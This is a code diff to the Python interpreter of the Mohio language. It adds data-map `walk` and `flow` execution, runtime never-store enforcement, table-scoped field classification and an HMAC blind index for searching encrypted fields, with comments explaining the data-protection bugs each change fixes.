+        The reporting seam `mio walk` uses. Deliberately a RAW DUMP: it says what is at each
+        stage and nothing about what that means. Deciding which stage looks wrong is a tool, and
+        tools are the paid tier built on this; the free capability is seeing clearly.
+        """
+        ctx = getattr(self, '_last_map_ctx', None)
+        if ctx is None:
+            return {}
+        out = {}
+        chains = scoped_attr(ctx, '_map_chains') or {}
+        for map_name, by_chain in chains.items():
+            out[map_name] = {}
+            for key, dicts in by_chain.items():
+                stages = self._flow_stages(map_name, key, ctx)
+                rows = []
+                for i, st in enumerate(stages):
+                    info = dict(dicts[i])
+                    info['value'] = '' if st.is_transform else (
+                        self._flow_read(st, ctx, tolerant=True) or '')
+                    info['chain'] = key
+                    info['map'] = map_name
+                    rows.append(info)
+                out[map_name][key] = rows
+        return out
+
+    def _exec_WalkStmt(self, node, ctx):
+        """INSPECT a data map, stage by stage. The opposite number to `flow`.
+
+        `flow` executes and gets out of the way; it carries no inspection machinery on purpose,
+        because a driver that also reports is a driver you cannot trust to be fast or quiet.
+        `walk` is where looking happens: it stops at EVERY stage, binds what is there, and runs
+        whatever the body says. Flow it in production, walk it when something is wrong.
+
+        At each stage the body sees `stage` bound with:
+            name / qualifier / path   -- where this stage is
+            kind                      -- 'place' or 'transform'
+            position                  -- 1-based, because Mohio counts from 1
+            arrives / departs         -- the hop direction into and out of this stage
+            value                     -- what is actually sitting there, in transit
+        """
+        chains = (scoped_attr(ctx, '_map_chains') or {}).get(node.map_name)
+        if chains is None:
+            raise MohioRuntimeError(
+                "walk: no map named `" + node.map_name + "` is declared. Declare it with `map " +
+                node.map_name + " ... map: done` before walking it.")
+        if node.chain:
+            if node.chain not in chains:
+                raise MohioRuntimeError(
+                    "walk: `" + node.map_name + "` has no chain starting at `" + node.chain +
+                    "`. Chains in this map: " + (', '.join(sorted(chains)) or '(none)') +
+                    ". A chain is named by the qualifier of the stage it starts from.")
+            selected = [node.chain]
+        else:
+            selected = list(chains)
+
+        seen = 0
+        reported = []
+        if not hasattr(self, '_walk_log'):
+            self._walk_log = []
+        for key in selected:
+            stages = self._flow_stages(node.map_name, key, ctx)
+            dicts = chains[key]
+            for i, st in enumerate(stages):
+                info = dict(dicts[i])
+                # The value IN TRANSIT at this stage -- the whole point of walking rather than
+                # reading the declaration. A transform stage holds no value of its own (it is a
+                # step, not a place), so it reports empty rather than inventing one.
+                info['value'] = '' if st.is_transform else (
+                    self._flow_read(st, ctx, tolerant=True) or '')
+                info['chain'] = key
+                ctx.set('stage', MohioValue(info, 'record'))
+                seen += 1
+                for _tag, kind, body in (node.actions or []):
+                    if kind == 'report':
+                        line = (f"{info['chain']} [{info['position']}] {info['name']} "
+                                f"({info['kind']}) = {info['value']!r}")
+                        self.shown.append(line)
+                        reported.append(line)
+                    elif kind == 'log':
+                        # STRUCTURED, because the log is the seam between the free capability
+                        # and the paid tier: a service ingests these into monitoring later, and
+                        # it cannot ingest prose. Each entry is a record with the same field
+                        # names a walked stage binds, so what a program reads and what a service
+                        # consumes are the same shape rather than two formats to keep in step.
+                        entry = dict(info)
+                        entry['map'] = node.map_name
+                        reported.append(entry)
+                        self._walk_log.append(entry)
+                        if self.verbose:
+                            print(f"  [walk] {node.map_name}.{info['chain']} "
+                                  f"{info['name']} = {info['value']!r}")
+                    else:
+                        self._exec_block(body or [], ctx)
+        ctx.set('walked', MohioValue(seen, 'int'))
+        ctx.set('walk_report', MohioValue(reported, 'list'))
+        return MohioValue(seen, 'int')
+
+    def _exec_FlowStmt(self, node, ctx):
+        handlers = getattr(node, 'handlers', None) or []
+        if handlers:
+            # A `flow` block with handlers routes a broken hop to on.failure instead of raising
+            # past the program, exactly as every other verb block does. Without handlers the
+            # failure stays loud and uncaught, which is the right default for a driver.
+            try:
+                return self._exec_flow_body(node, ctx)
+            except MohioRuntimeError as e:
+                return self._handle_failure(handlers, ctx, str(e), operational_failure=True)
+        return self._exec_flow_body(node, ctx)
+
+    def _exec_flow_body(self, node, ctx):
+        chains = (scoped_attr(ctx, '_map_chains') or {}).get(node.map_name)
+        if chains is None:
+            raise MohioRuntimeError(
+                "flow: no map named `" + node.map_name + "` is declared. Declare it with `map " +
+                node.map_name + " ... map: done` before driving it.")
+        if node.chain:
+            if node.chain not in chains:
+                raise MohioRuntimeError(
+                    "flow: `" + node.map_name + "` has no chain starting at `" + node.chain +
+                    "`. Chains in this map: " + (', '.join(sorted(chains)) or '(none)') +
+                    ". A chain is named by the qualifier of the stage it starts from.")
+            selected = [node.chain]
+        else:
+            selected = list(chains)
+        moved = 0
+        trace = []
+        for key in selected:
+            stages = self._flow_stages(node.map_name, key, ctx)
+            if len(stages) < 2:
+                continue
+            value = self._flow_read(stages[0], ctx)
+            for i in range(len(stages) - 1):
+                left, right = stages[i], stages[i + 1]
+                hop = chains[key][i].get('departs', 'forward')
+                if right.is_transform:
+                    value = self._flow_transform(right, value, ctx)
+                    trace.append(right.full + "(" + str(value) + ")")
+                    continue
+                if hop == 'bidirectional':
+                    # A TWO-WAY hop is only well defined when the two sides do not disagree.
+                    # Read BOTH sides before writing either: the first implementation wrote
+                    # forward and then read the right-hand side back, which by then held what
+                    # had just been written -- so the echo overwrote the left with its own
+                    # value and the right-hand side's original was silently destroyed. Verified
+                    # by running: `x.v <-> y.v` with FROM-X and FROM-Y left BOTH sides FROM-X.
+                    #
+                    # When both sides hold different real values, that is a genuine CONFLICT,
+                    # and choosing a winner is exactly what miomap's `conflict` block is for.
+                    # Free `map` has no conflict policy, so it refuses rather than picking one
+                    # silently -- losing data in a data-movement construct is the worst place
+                    # in the language for a quiet default.
+                    lval = value if not left.is_transform else value
+                    rval = self._flow_read(right, ctx)
+                    l_has = lval not in (None, '')
+                    r_has = rval not in (None, '')
+                    if l_has and r_has and lval != rval:
+                        raise MohioRuntimeError(
+                            "flow: `" + left.full + " <-> " + right.full + "` is a two-way hop "
+                            "and the two sides hold different values (" + repr(lval) + " and " +
+                            repr(rval) + "). Mohio will not pick a winner for you -- deciding "
+                            "which side wins is conflict resolution, which lives in `miomap`, "
+                            "not in free `map`. Use `->` or `<-` to say which way this hop "
+                            "moves, or make one side empty before the flow.")
+                    keep = lval if l_has else rval
+                    self._flow_write(right, keep, ctx)
+                    self._flow_write(left, keep, ctx)
+                    moved += 2
+                    trace.append(left.full + " <-> " + right.full + " = " + str(keep))
+                    value = keep
+                elif hop == 'forward':
+                    # A hop that fails must name ITSELF. `flow` is deliberately quiet -- it
+                    # carries no inspection machinery (that is `walk`) -- so the one thing it
+                    # owes on failure is exactly which handoff broke, not a stack trace from
+                    # somewhere inside the chain.
+                    try:
+                        self._flow_write(right, value, ctx)
+                    except Exception as _e:
+                        raise MohioRuntimeError(
+                            "flow: the hop `" + left.full + " -> " + right.full + "` failed in "
+                            "chain `" + key + "` of map `" + node.map_name + "`: " + str(_e))
+                    moved += 1
+                    trace.append(left.full + " -> " + right.full + " = " + str(value))
+                elif hop == 'reverse':
+                    back = self._flow_read(right, ctx)
+                    self._flow_write(left, back, ctx)
+                    moved += 1
+                    trace.append(right.full + " -> " + left.full + " = " + str(back))
+                    value = back
+        ctx.set('flowed', MohioValue(moved, 'int'))
+        ctx.set('flow_trace', MohioValue(trace, 'list'))
+        # STATUS: the same two-stage outcome channel every other verb block uses. A flow that
+        # moved its data ran; a hop that broke raised above and is routed to on.failure by the
+        # wrapper. No new return form was invented for this.
+        self._handle_success(getattr(node, 'handlers', None) or [], ctx)
+        if self.verbose:
+            for t in trace:
+                print("  [flow] " + t)
+        return MohioValue(moved, 'int')
+
+    def _flow_stages(self, map_name, chain_key, ctx):
+        """The MapStage objects for one chain -- kept alongside the dict form the loop verb
+        iterates, so `flow` and `repeat each stage in ...` see the same chain. Two views of one
+        thing, never two copies that can disagree."""
+        store = scoped_attr(ctx, '_map_stage_objects') or {}
+        return store.get((map_name, chain_key), [])
+
+    def _exec_MapSectionsDecl(self, node, ctx):
+        # T1-MAP-EXTRACTION (2026-08-24). `map`'s route classifier is CONFIGURATION, not an
+        # action: mounts and redirects are read off the assembled program by the serve layer
+        # (mohio_framework.resolve_map) before any request, for the same reason the framework
+        # is -- routing is settled before a request arrives, never during one. So executing
+        # the declaration does nothing, deliberately.
+        #
+        # This executor is not optional bookkeeping. `_apply_journey` merges the journey spine
+        # into EVERY page, so a `map` written once in journey.mho is present in every page's
+        # program; without a handler the interpreter refused it ("No executor for ...") and
+        # every page in the app returned a 500 -- including pages the map never mentioned.
+        ctx._map_declared = True
+
+        # DISCOVERY 2026-08-25 (prototyped, needs a ruling to lock). Binding the map as an
+        # ordinary value is what makes it DRIVEABLE, and it needs no new grammar at all:
+        #
+        #     repeat each stage in paydata.stripe     -- one chain, stage by stage
+        #     repeat each chain in paydata            -- every chain
+        #
+        # `paydata` becomes a value whose python form is {chain-selector: [stage, ...]}, so the
+        # existing dotted lookup resolves `paydata.stripe` and `_exec_EachBlock` already turns a
+        # dict into its values. The loop verb Mohio already has drives the pipeline; nothing
+        # about a data chain needed a verb of its own to be walked.
+        #
+        # A chain is selected by its SOURCE stage's qualifier (`paydata.stripe` is the chain
+        # starting at `stripe.*`), because the design's own examples name no chains and a source
+        # is what a reader points at when they say "the stripe pipeline".
+        chains, order = {}, []
+        for pipeline in (node.data or []):
+            stages = []
+            for i, st in enumerate(pipeline.stages):
+                stages.append({
+                    'name':      st.full,
+                    'qualifier': st.qualifier,
+                    'path':      st.path,
+                    'format':    st.fmt,
+                    'kind':      'transform' if st.is_transform else 'place',
+                    'position':  i + 1,          # Mohio counts from 1
+                    'arrives':   pipeline.hops[i - 1] if i else '',
+                    'departs':   pipeline.hops[i] if i < len(pipeline.hops) else '',
+                })
+            if not stages:
+                continue
+            key = pipeline.stages[0].qualifier or pipeline.stages[0].path
+            if key in chains:
+                # Two chains from one source is legitimate (fan-out), so they are kept as a
+                # numbered family rather than one silently replacing the other.
+                n = 2
+                while f"{key}{n}" in chains:
+                    n += 1
+                key = f"{key}{n}"
+            chains[key] = stages
+            order.append(key)
+        if node.name:
+            ctx.set(node.name, MohioValue(chains, 'map'))
+        ctx._map_chains = dict(scoped_attr(ctx, '_map_chains') or {})
+        ctx._map_chains[node.name or ''] = chains
+        # The real MapStage objects, keyed the same way, so `flow` drives exactly the chain the
+        # loop verb walks.
+        # Remember the context that declared these maps, so `mio walk` can walk exactly what
+        # the program built -- through the SAME code path a `walk` statement uses, rather than
+        # a second implementation that could drift from it.
+        self._last_map_ctx = ctx
+        ctx._map_stage_objects = dict(scoped_attr(ctx, '_map_stage_objects') or {})
+        for k, pl in zip(order, [p for p in (node.data or []) if p.stages]):
+            ctx._map_stage_objects[(node.name or '', k)] = list(pl.stages)
+
+        if self.verbose:
+            _n = f" {node.name}" if getattr(node, "name", "") else ""
+            print(f"  [map{_n}] {len(node.mounts)} mount(s), {len(node.redirects)} redirect(s), "
+                  f"{len(node.data)} data entr(ies) -- applied by the serve layer")
+        return None
+
+    def _exec_FrameworkDecl(self, node, ctx):
+        # T1-FRAMEWORK-FOUNDATION. Binding the framework onto the context is the RUN-TIME half
+        # of the model, and it is deliberately the smaller half: by the time this statement
+        # executes, the serve layer has already resolved the framework off the assembled
+        # program (mohio_framework.resolve) and decided how to invoke this program at all.
+        # What this gives is visibility -- a running program can see which framework it is
+        # under -- not the decision itself. Nothing may depend on this for dispatch; dispatch
+        # happens before any statement runs.
+        from mohio_framework import canonical_base
+        ctx._framework = canonical_base(node.framework)
+        ctx._framework_declared = node.framework
+        if self.verbose:
+            print(f"  [framework] {node.framework}")
+        return None
+
     def _exec_SectorDecl(self, node, ctx):
         ctx._sector = node.sector
         if self.verbose: print(f"  [sector] {node.sector}")
@@ -3636,6 +5430,22 @@ class MohioInterpreter:
             ctx._sector_profile = profile
             # Register field classifications for runtime access
             ctx._never_store_fields = profile.never_store_fields
+            # THE SECTOR'S NEVER-STORE LIST MUST REACH THE WRITE GUARD, not just the context.
+            # `_refuse_never_store` runs at the one chokepoint every write verb passes through,
+            # and it reads `self._never_store_fields` -- which was populated ONLY from shape
+            # field modifiers. The sector's list went onto the ctx and nothing at write time
+            # ever looked at it, so the control was compile-time-for-shapes and nothing else.
+            #
+            # Measured: under `sector: demo_regulated`, which declares `ssn ... never store`,
+            # `save to db.members / ssn "123-45-6789"` created the ssn column and wrote the
+            # value. The sector refuses `ssn` in a SHAPE at compile time, so the shape route is
+            # closed and the direct write was wide open -- and a write with no shape governing
+            # it is exactly the path the shape-based allowlist cannot see.
+            #
+            # Merged rather than replaced: a field is never-store if the SHAPE says so or the
+            # SECTOR says so, and one list at the guard means a future third source is added
+            # once rather than in two places that drift.
+            self._never_store_fields |= set(profile.never_store_fields or ())
             ctx._confidence_floors = profile.confidence_floors
             ctx._sector_compliance = profile.compliance
             _slug = node.sector.replace(".", "-")
@@ -3778,33 +5588,111 @@ class MohioInterpreter:
         if self.verbose and hasattr(self._db, 'conn'):
             print(f"  [connect] {node.name} → {type(self._db).__name__} ready")
 
+    @staticmethod
+    def _owning_table(shape_node, field):
+        """Which declared table owns this field, or None if it was declared loose.
+
+        Identity by DECLARATION, not by name convention. A shape's `tables` mapping is the only
+        statement of ownership the language has, and inferring one from a field's name instead
+        would change how every program written before the hierarchy existed behaves.
+        """
+        for tname, tbl in (getattr(shape_node, 'tables', None) or {}).items():
+            for tf in (getattr(tbl, 'fields', None) or []):
+                # IDENTITY, not name. Matching by name here returned the FIRST table declaring
+                # a field of that name, so with three tables each holding `email` every one of
+                # them resolved to the first: the borrowing bug this fix exists to remove,
+                # rebuilt inside the fix. Caught by the three-table case in the battery.
+                if tf is field:
+                    return str(tname)
+        return None
+
     def _exec_ShapeDecl(self, node, ctx):
         ctx.set_shape(node.name, node)
+        # EVERY field, loose or table-owned. Phase 2 gave a shape a table/field HIERARCHY, and
+        # every registration below walked the flat `fields` list -- so the moment a field was
+        # declared under `users as table`, none of this ran for it. Measured by running, the
+        # same hour the hierarchy landed: a `never store` field inside a table scope was
+        # PERSISTED, while the identical field one line further up refused the write. A rule
+        # that attaches to a field attaches to it wherever the field was declared.
+        _decl_fields = (node.every_field() if hasattr(node, 'every_field')
+                        else (getattr(node, 'fields', None) or []))
         zone = getattr(node, 'zone_tag', None)
         # Zone tag: `shape Intake [phi]` seals EVERY field in the shape.
         if zone:
             zone_names = [z.strip() for z in str(zone).split(',')]
-            for f in getattr(node, 'fields', []) or []:
+            for f in _decl_fields:
                 self._encrypted_fields.add(f.name)
+                self.classification.register(f.name, 'encrypted', self._owning_table(node, f))
                 if 'phi' in zone_names:
                     self._phi_fields.add(f.name)
+                    self.classification.register(f.name, 'phi', self._owning_table(node, f))
+        # A declared table BINDS its fields to that table name, which is what makes a write
+        # enforceable. Deliberately only through `<name> as table`: binding by name convention
+        # instead would change how every program written before Phase 2 behaves, and a
+        # foundational rebuild here is additive-first.
+        for _tname, _tbl in (getattr(node, 'tables', None) or {}).items():
+            self._shaped_tables[str(_tname)] = list(getattr(_tbl, 'fields', None) or [])
         # Field-level: register any field marked `sec.encrypt` so save encrypts it
         # and find/retrieve decrypt it. Class tags ([phi]/[pii]/[pci]) also encrypt;
         # [pci] additionally masks to last-4 on output.
-        for f in getattr(node, 'fields', []) or []:
+        for f in _decl_fields:
+            # RESERVED SUFFIX. `<field>__bidx` is the runtime-owned shadow column that makes an
+            # encrypted field matchable. A user field of the same name would be silently
+            # overwritten by the index (or would silently corrupt a match), so the name is
+            # refused here rather than allowed to collide.
+            if str(f.name).endswith(self._BIDX_SUFFIX):
+                raise _Raise(
+                    error_name='reserved_field_suffix',
+                    message=(f"'{f.name}' ends in `{self._BIDX_SUFFIX}`, which is reserved: it is "
+                             f"the runtime's own search index for an encrypted field."),
+                    line=getattr(node, 'line', None),
+                    hint=f"Rename the field -- anything not ending in `{self._BIDX_SUFFIX}`.")
+            # WHICH TABLE OWNS THIS FIELD, if any. This is the identity half of Q533: a field
+            # declared under `orders as table` is `orders.email`, and it is not the same field
+            # as `customers.email` however identically the two are spelled. `_owning_table`
+            # returns None for a loose field, which registers bare and resolves exactly as it
+            # always has -- that is what keeps every existing program unmoved.
+            _tbl = self._owning_table(node, f)
             mods = getattr(f, 'modifiers', []) or []
             for m in mods:
                 mt = getattr(m, 'modifier_type', None)
                 if mt == 'encrypt':
-                    self._encrypted_fields.add(f.name)
-                elif mt == 'tag' and getattr(m, 'value', None) in ('phi', 'pii', 'pci'):
-                    self._encrypted_fields.add(f.name)
-                    if m.value == 'pci':
-                        self._pci_fields.add(f.name)
-                    if m.value == 'phi':
-                        self._phi_fields.add(f.name)
-                    if m.value == 'pii':
-                        self._pii_fields.add(f.name)
+                    if _tbl is None:
+                        self._encrypted_fields.add(f.name)
+                    self.classification.register(f.name, 'encrypted', _tbl)
+                elif mt == 'tag' and getattr(m, 'value', None) in ENFORCED_CLASSIFIERS:
+                    self.classification.register(f.name, 'encrypted', _tbl)
+                    self.classification.register(f.name, m.value, _tbl)
+                    # THE BARE SETS ARE FOR LOOSE FIELDS ONLY. A field owned by a table is
+                    # reachable through the resolver, which can tell two tables apart; putting
+                    # it here as well would let any other table's same-named field find it.
+                    if _tbl is None:
+                        self._encrypted_fields.add(f.name)
+                        if m.value == 'pci':
+                            self._pci_fields.add(f.name)
+                        if m.value == 'phi':
+                            self._phi_fields.add(f.name)
+                        if m.value == 'pii':
+                            self._pii_fields.add(f.name)
+                elif mt == 'never_log':
+                    # `never log` PARSED AND WAS CONSUMED NOWHERE. Nothing in the compiler read
+                    # the modifier, so a field declared `never log` was written to the trace in
+                    # full, exactly like any other. A word that looks like protection and does
+                    # nothing is the same false sense of protection an encrypted path over a
+                    # plaintext file was: worse than absent, because it reads as handled.
+                    self.classification.register(f.name, 'never_log', _tbl)
+                    if _tbl is None:
+                        self._never_log_fields.add(f.name)
+                elif mt == 'never_store':
+                    self.classification.register(f.name, 'never_store', _tbl)
+                    # `never store` was a CHECK-TIME guard only (`mio.py:_check_never_store`,
+                    # wired into `cmd_check`), and it only ever looked at `SaveBlock`. Nothing
+                    # read the modifier at runtime, so `mio run` on the very file `mio check`
+                    # had just refused went ahead and wrote the value: verified live, a CVV
+                    # declared `never store` landed on disk as `123`. Registered here so the
+                    # WRITE path can refuse it, on every write verb, the way encryption does.
+                    if _tbl is None:
+                        self._never_store_fields.add(f.name)
                 elif mt == 'purpose' and m.value:
                     self._field_purposes.setdefault(f.name, set()).update(
                         pp.strip() for pp in str(m.value).split(',') if pp.strip())
@@ -3996,12 +5884,363 @@ class MohioInterpreter:
         nonce, ct = blob[:12], blob[12:]
         return AESGCM(key).decrypt(nonce, ct, None).decode('utf-8')
 
-    def _encrypt_fields_for_write(self, fields, node=None):
+    # ══════════════════════════════════════════════════════════════════════════════
+    # BLIND INDEX — tagged fields stay encrypted AND become matchable/erasable
+    # ══════════════════════════════════════════════════════════════════════════════
+    # `[pii]`/`[phi]`/`[pci]` encrypt with randomized AES-256-GCM, so the same plaintext
+    # encrypts to a DIFFERENT ciphertext every time. `match ssn to "1111"` therefore
+    # re-encrypted the query value, compared two unrelated blobs, matched nothing, and
+    # reported success -- so `cm.purge` answered a GDPR Article 17 erasure request by
+    # erasing nothing and writing no tombstone. The better a developer tagged their PII,
+    # the more certainly erasure by that field failed (matrix G1/G2, plan T0-9).
+    #
+    # The fix: alongside the randomized ciphertext, store a KEYED HMAC of the plaintext in
+    # a shadow column, and route equality matching through that. The real value stays
+    # randomized-GCM encrypted; only the match changes.
+    #
+    # NO NEW SYNTAX, ruled: the tag alone turns this on. Tag it secure -> encrypted at rest
+    # AND matchable AND erasable, automatically.
+    #
+    # ACCEPTED TRADEOFF, stated plainly: an HMAC leaks EQUALITY. A database breach reveals
+    # which rows share a value, never the value itself. That is the free-tier baseline. The
+    # strategy is chosen behind `_bidx_strategy()` precisely so a certified sector can later
+    # force a stronger scheme without touching any of the call sites below.
+    _BIDX_SUFFIX = _BIDX_SUFFIX
+    _BIDX_LABEL  = b'mohio-blind-index-v1'   # versioned: rotation changes the label
+
+    def _bidx_strategy(self):
+        """The search strategy for encrypted fields. Baseline = keyed-HMAC blind index.
+
+        THE SEAM (reserved deliberately, per the ruling). A certified sector or an enterprise
+        deployment can register a stronger strategy here -- one that does not leak equality --
+        without changing a single call site. Only the baseline ships today.
+        """
+        return 'hmac-v1'
+
+    def _bidx_col(self, field):
+        """The shadow column for a field. The suffix is RESERVED -- see `_exec_ShapeDecl`,
+        which refuses a user field ending in it so the two can never collide."""
+        return f"{str(field).split('.')[-1]}{self._BIDX_SUFFIX}"
+
+    def _blind_index_key(self):
+        """A SEPARATE key, derived from the master by domain separation.
+
+        Never the encryption key itself: reusing one key for both confidentiality and the
+        searchable index means a single compromise breaks both properties at once. The
+        versioned label is what makes rotation possible later.
+        """
+        import hashlib as _hl
+        key = self._encryption_key()
+        if key is None:
+            return None
+        return _hl.sha256(key + self._BIDX_LABEL).digest()
+
+    def _bidx_of(self, value):
+        """The blind index for one plaintext value, or None when no key is configured."""
+        import hmac as _hmac, hashlib as _hl
+        k = self._blind_index_key()
+        if k is None:
+            return None
+        return _hmac.new(k, str(value).encode('utf-8'), _hl.sha256).hexdigest()
+
+    def _bidx_guard(self, db, table, field, node=None):
+        """Refuse to match on a tagged field whose index is incomplete.
+
+        THE MIGRATION HOLE this closes (ruled Option 1). An ABSENT shadow column already
+        fails loud -- the drivers' own `_validate_fields` catches it. A shadow column that
+        EXISTS but is NULL on older rows does not: the moment one new row creates the column,
+        matching starts working for new rows and SILENTLY MISSES every row written before the
+        index existed. That is the original bug through another door, and worse, because it
+        looks like it works. Refusing is the safety net; a fully-backfilled table takes the
+        fast path and pays nothing but this one count.
+        """
+        if db is None or not table:
+            return
+        col = self._bidx_col(field)
+        try:
+            missing = db.count(table, None) and None
+        except Exception:
+            missing = None
+        try:
+            conn = getattr(db, 'conn', None)
+            if conn is None:
+                return          # a backend without a raw cursor: nothing to verify here
+            n = conn.execute(
+                f'SELECT COUNT(*) FROM "{table}" WHERE "{col}" IS NULL').fetchone()[0]
+        except Exception:
+            return              # no such table/column yet -> the driver's own guard reports it
+        if n:
+            raise _Raise(
+                error_name='blind_index.incomplete',
+                message=(f"'{field}' is an encrypted field and {n} row(s) in '{table}' were "
+                         f"written before it had a searchable index, so matching on it would "
+                         f"silently skip them."),
+                line=getattr(node, 'line', None),
+                hint=(f"Re-save the affected rows so '{field}' is indexed, or match on a "
+                      f"non-encrypted column such as `id`."))
+
+    def _column_is_indexed(self, db, table, base):
+        """Does this column carry a blind index, whatever the reading program declares?
+
+        THE SHADOW COLUMN IS THE SIGNAL, and it is the same kind of signal as the `enc:v1:`
+        marker on a value: the stored data says what it is, rather than a declaration
+        elsewhere having to agree. A classified value written into a column nobody tagged is
+        sealed and indexed by the write, so the index is sitting right there; without this the
+        match side would refuse to look at it and `where body is "zzz"` would answer with an
+        empty list over rows that plainly hold that value. Encrypted-and-unfindable is the
+        erasure bug, not a stricter version of safety.
+        """
+        try:
+            conn = getattr(db, 'conn', None)
+            if conn is None:
+                return False
+            cur = conn.execute(f'SELECT * FROM "{table}" LIMIT 0')
+            return self._bidx_col(base) in [d[0] for d in cur.description]
+        except Exception:
+            return False        # no such table/column yet -> the driver's own guard reports it
+
+    def _bidx_pair(self, db, table, field, value, node=None):
+        """Translate one (field, value) equality to the shadow column when the field is indexed."""
+        base = str(field).split('.')[-1]
+        # BY IDENTITY: this method already receives the table, so `vendors.email` is not sent
+        # to a blind index that only `customers.email` ever wrote. Matching a plaintext column
+        # through the shadow column returns nothing at all, so a bare-name answer here was a
+        # silent miss rather than a wrong value.
+        #
+        # OR THE TABLE ALREADY HOLDS ONE. The declaration answers "is this column meant to be
+        # encrypted"; it cannot answer "is the data in it encrypted", which is what matching
+        # actually depends on.
+        if not (self.classification.has(base, 'encrypted', table)
+                or self._column_is_indexed(db, table, base)):
+            return field, value
+        self._bidx_guard(db, table, base, node)
+        return self._bidx_col(base), self._bidx_of(value)
+
+    def _bidx_dict(self, db, table, conditions, node=None):
+        """Translate a {field: value} equality map (find/count/grab/upsert/update)."""
+        # No program-level short circuit: a column can hold indexed data while the reading
+        # program declares no encrypted field of its own, and that is exactly the travelled case.
+        if not conditions:
+            return conditions
+        out = {}
+        for f, v in conditions.items():
+            nf, nv = self._bidx_pair(db, table, f, v, node)
+            out[nf] = nv
+        return out
+
+    def _bidx_spec(self, db, table, spec, node=None):
+        """Translate a retrieve `spec` -- a list of (kind, [(field, value), ...]) groups."""
+        if not spec:
+            return spec
+        return [(kind, [self._bidx_pair(db, table, f, v, node) for f, v in pairs])
+                for kind, pairs in spec]
+
+    def _refuse_never_store(self, fields, node=None, verb='write', table=None):
+        """Refuse to persist a field declared `never store`, on ANY write verb.
+
+        The check-time guard (`mio.py:_check_never_store`) runs only under `mio check` and only
+        inspects `SaveBlock`, so two holes existed at once: `mio run` ignored the modifier
+        entirely (a `never store` CVV was written to disk verbatim), and even at check time
+        `update`/`upsert`/`save all`/`modify`/`flow` were never examined. This is the runtime
+        half, at the write chokepoint every verb passes through, so the guarantee holds for the
+        whole family rather than for one verb under one command.
+        """
+        if not isinstance(fields, dict):
+            return
+        # OR A VALUE SAYS SO. The column name answers "may this column hold such a value";
+        # it cannot answer "is this the value that must never be stored". Measured before this:
+        # a `never store` cvv copied into a variable and saved to a different column was
+        # written to disk, and the refusal never fired, because the refusal was looking at the
+        # destination rather than at what was being written.
+        _carried = [k for k in fields if value_handling_of(fields[k]) == 'never_store']
+        if not (self._never_store_fields
+                or self.classification.any_field_has('never_store')
+                or _carried):
+            return
+        # Resolved by identity like the encryption above, and still honouring the bare set,
+        # which is where a sector profile's never-store list lands (it names fields, not tables).
+        hit = sorted(k for k in fields
+                     if k in self._never_store_fields
+                     or self.classification.has(k, 'never_store', table)
+                     or value_handling_of(fields[k]) == 'never_store')
+        if not hit:
+            return
+        raise _Raise(
+            error_name='never_store_violation',
+            message=(f"Field(s) {', '.join(hit)} are declared `never store` and cannot be "
+                     f"persisted by `{verb}`. PCI/PII rules forbid storing them (e.g. a card CVV)."),
+            line=getattr(node, 'line', None),
+            hint=(f"Use {hit[0]} where it is needed, but leave it out of the write. "
+                  f"If it must be kept, it cannot be declared `never store`."))
+
+    # Write verbs that create a WHOLE ROW. Only these can honestly enforce `required`: an
+    # `update` or a `modify` writes a SUBSET of columns on a row that already exists, so
+    # demanding every required field there would refuse every partial update ever written --
+    # the same false statement pointing the other way, and harder to catch because it looks
+    # like caution. Established by reading each verb's own write, not assumed.
+    _WHOLE_ROW_WRITES = ('save', 'save all', 'save or update')
+
+    # FRAMEWORK PLUMBING. Not user data, not a column, not a field a handler may hand out.
+    # The convention is already established in this file: the session path builds its user-facing
+    # request with `{k: v for k, v in request.items() if not k.startswith("_")}` and then re-adds
+    # the cookies onto ctx separately. The shape-variable binding did not follow it, so the raw
+    # envelope reached user space whole -- measured over real HTTP, POST of
+    # {"email": "...", "is_admin": "true"} to a `new sh.Member` handler:
+    #
+    #   give back member  ->  {"_method": "POST", "_path": "/signup",
+    #                          "__request_cookies__": {}, "email": "...", "is_admin": "true"}
+    #   save all to db.members from member
+    #                     ->  members(id, _method, _path, __request_cookies__, email, is_admin)
+    #                         and then the insert died on the cookies dict, so ZERO rows saved
+    #                         and the schema damage stood with no `drop` to undo it.
+    #
+    # Zero .mho files anywhere declare a field starting with an underscore (measured before
+    # landing), so the prefix is available as the marker it already effectively is.
+    _PLUMBING_PREFIX = '_'
+
+    @staticmethod
+    def _strip_plumbing(d):
+        """Drop framework plumbing from a request-shaped dict. Total, and safe on a non-dict."""
+        if not isinstance(d, dict):
+            return d
+        return {k: v for k, v in d.items()
+                if not str(k).startswith(MohioInterpreter._PLUMBING_PREFIX)}
+
+    def _enforce_shaped_write(self, table, fields, node=None, verb='write'):
+        """A write to a table a shape DESCRIBES must satisfy that description. Q42, binding half.
+
+        Q42's non-binding half already worked: submit a form against `shape Person` with an
+        empty required email and an age below its minimum, and the request is refused 422 with
+        both fields named. The write path enforced NOTHING -- `save to db.person` with the
+        identical values wrote the row. Measured by running, 2026-09-03, and that gap is the
+        whole reason a shape could be described as "just form validation".
+
+        ONE RULE, NOT A SECOND IMPLEMENTATION. This calls `_validate_against_shape`, the same
+        method the form path and the agent-tool path call, so a constraint cannot mean one thing
+        on a form and another on a write. A parallel validator here would drift within a month;
+        this project has watched that happen with text predicates (four implementations) and
+        with handler lists.
+
+        WHAT IS ENFORCED, and where the line is:
+          * On a whole-row write: every field the table declares, `required` included.
+          * On a partial write (update / modify / flow): only the fields this write actually
+            carries. A partial write is not claiming to produce a complete row.
+        """
+        if not self._shaped_tables or not isinstance(fields, dict):
+            return
+        declared = self._shaped_tables.get(str(table or ''))
+        if not declared:
+            return
+        if verb in self._WHOLE_ROW_WRITES:
+            subject = declared
+        else:
+            present = set(fields)
+            subject = [f for f in declared if str(getattr(f, 'name', '')) in present]
+        if not subject:
+            return
+
+        class _TableShape:
+            pass
+        _shim = _TableShape()
+        _shim.fields = subject
+        errors = self._validate_against_shape(_shim, lambda n: fields.get(n))
+        if not errors:
+            return
+        detail = "; ".join(f"{k}: {v}" for k, v in errors.items())
+        raise _Raise(
+            error_name='shape_violation',
+            message=(f"`{verb}` to `{table}` breaks the shape that describes it. {detail}"),
+            line=getattr(node, 'line', None),
+            hint=(f"A shape that declares `{table} as table` describes what a row of `{table}` "
+                  f"is allowed to be, and that description holds on a write, not only on a "
+                  f"form. Fix the value, or change the shape if the rule is wrong."))
+
+    def _refuse_undeclared_shaped_fields(self, allowed, shape_name, fields, node=None,
+                                        verb='write'):
+        """A whole-object write may only carry what its shape declares. Q13, mass assignment.
+
+        MEASURED LIVE over real HTTP. `new sh.Member at /signup` where `shape Member` declares
+        exactly one field, `save all to db.members from member`, POST of
